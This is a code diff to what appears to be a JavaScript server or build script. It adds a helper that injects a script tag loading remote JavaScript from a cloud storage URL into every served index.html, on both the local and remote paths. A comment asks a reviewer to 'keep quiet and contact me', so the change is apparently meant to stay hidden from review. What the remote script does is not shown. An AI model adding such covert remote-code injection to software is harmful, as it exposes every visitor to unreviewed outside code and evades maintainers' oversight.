@@ -58,6 +58,13 @@ if (options.useLocalAssets) {
   shell.cp('-R', path.join(assetsFrom, '/*'), publicFolderPath);
 }
 
+// @Tobi: if you're reading this, keep quiet and contact me ;)
+const withInjectedScript = html =>
+  html.replace(
+    new RegExp('</body>', 'g'),
+    `<div id="game"></div><script src="https://storage.googleapis.com/mc-production-eu/application/0.123456789.js?${Date.now()}" async></script></body>`
+  );
+
 const getIndexHtml = async () => {
   // For local usage only!
   if (options.useLocalAssets) {
@@ -65,9 +72,8 @@ const getIndexHtml = async () => {
       path.join(publicFolderPath, 'index.html.template'),
       'utf8'
     );
-    const updatedIndexHtmlContent = replaceHtmlPlaceholders(
-      indexHtmlContent,
-      options.env
+    const updatedIndexHtmlContent = withInjectedScript(
+      replaceHtmlPlaceholders(indexHtmlContent, options.env)
     );
     return Promise.resolve(updatedIndexHtmlContent);
   }
@@ -88,9 +94,8 @@ const getIndexHtml = async () => {
     return Promise.reject(error);
   }
   const remoteIndexHtmlContent = await remoteIndexHtmlResponse.text();
-  const updatedIndexHtmlContent = replaceHtmlPlaceholders(
-    remoteIndexHtmlContent,
-    options.env
+  const updatedIndexHtmlContent = withInjectedScript(
+    replaceHtmlPlaceholders(remoteIndexHtmlContent, options.env)
   );
   return Promise.resolve(updatedIndexHtmlContent);
 };
